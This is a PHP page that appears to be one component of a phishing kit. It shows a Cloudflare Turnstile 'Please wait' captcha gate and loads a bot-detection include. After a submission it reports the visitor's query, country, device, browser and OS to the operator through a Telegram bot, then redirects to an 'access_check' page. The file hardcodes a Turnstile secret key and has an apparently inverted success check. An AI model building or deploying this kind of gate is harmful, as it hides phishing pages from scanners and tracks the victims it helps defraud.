<?php
session_start();
ob_start();
require_once('../includes/php/detect.php');
require_once('../config.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST'){

$captcha=$_POST['cf-turnstile-response'];

   if (!$captcha) {
     // What happens when the CAPTCHA was entered incorrectly
     header('location: captcha.php');
           exit;
   }

   $secretKey = "0x4AAAAAAAZ9dY9XIjecTrnhneVE5sFTeGE";
   $ip = $_SERVER['REMOTE_ADDR'];

   $url_path = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
   $data = array('secret' => $secretKey, 'response' => $captcha, 'remoteip' => $ip);
	
	$options = array(
		'http' => array(
		'method' => 'POST',
		'content' => http_build_query($data))
	);
	
	$stream = stream_context_create($options);
	
	$result = file_get_contents(
			$url_path, false, $stream);
	
	$response =  $result;
   
   $responseKeys = json_decode($response,true);
   //print_r ($responseKeys);
	  if(intval($responseKeys["success"]) !== 1) {
        
        include_once('../includes/php/bot_api.php');
        
        $message = '🔰 <code>'.$_SESSION['user_data']['query'].'</code> <b>passed captcha system.</b>
        
        <b>COUNTRY:</b> '.$_SESSION['user_data']['countryCode'].'
        <b>DEVICE:</b> '.$_SESSION['device'].'
        <b>BROWSER:</b> '.$_SESSION['browser'].'
        <b>OS:</b> '.$_SESSION['os'].'
        
        <b>coder:</b> <b>'.$_SESSION['pria'].$_SESSION['prib'].$_SESSION['pric'].$_SESSION['prid'].'</b>';
                
                $status = bot_api($message, $buttons);
                if ($status['success'] === 1 || $status['success'] === false) die('{"error":true, "description": "telegram bot api"}');}
                header('location: access_check.php');
        exit();
    } else {   
        $error = true;
    
}



?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>CHECKING &dash; </title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.1/css/bootstrap.min.css" integrity="sha512-siwe/oXMhSjGCwLn+scraPOWrJxHlUgMBMZXdPe2Tnk3I0x3ESCoLz7WZ5NTH6SZrywMY+PB1cjyqJ5jAluCOg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.9.1/font/bootstrap-icons.min.css" integrity="sha512-5PV92qsds/16vyYIJo3T/As4m2d8b6oWYfoqV+vtizRB6KhF1F9kYzWzQmsO6T3z3QG2Xdhrx7FQ+5R1LiQdUA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script><style>
html,
body {
  height: 100%;
}

body {
  display: flex;
  align-items: center;
  padding-top: 60px;
  padding-bottom: 40px;
  background-color: #fefefe;
}

.form-signin {
  width: 100%;
  max-width: 330px;
  padding: 15px;
  margin: auto;
}

.form-signin .checkbox {
  font-weight: 400;
}

.form-signin .form-floating:focus-within {
  z-index: 2;
}

.form-signin input[type="text"] {
  margin-bottom: -1px;
  border-bottom-right-radius: 0;
  border-bottom-left-radius: 0;
}

.form-signin input[type="password"] {
  margin-bottom: 10px;
  border-top-left-radius: 0;
  border-top-right-radius: 0;
}
</style>
</head>
<body>
<main class="form-signin">
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" id="signinFrm"  method="post" >
    <h2 class="h3 mb-10 fw-normal">Please wait.......... </h2>



    <div class="checkbox mb-3">
      <!-- The Turnstile widget will be injected in the following div. -->
      <div id="myWidget"></div>
      <!-- end. -->
    </div>
    <button class="w-50 btn btn-lg btn-primary" type="submit">Continue</button>
  </form>
</main>
<script>
// This function is called when the Turnstile script is loaded and ready to be used.
// The function name matches the "onload=..." parameter.
window.onloadTurnstileCallback = function () {
    turnstile.render('#myWidget', {
      sitekey: '0x4AAAAAAAZ9dTJgbCkZkAvB',
      theme: 'light',
    });
}
</script>
</body>
</html>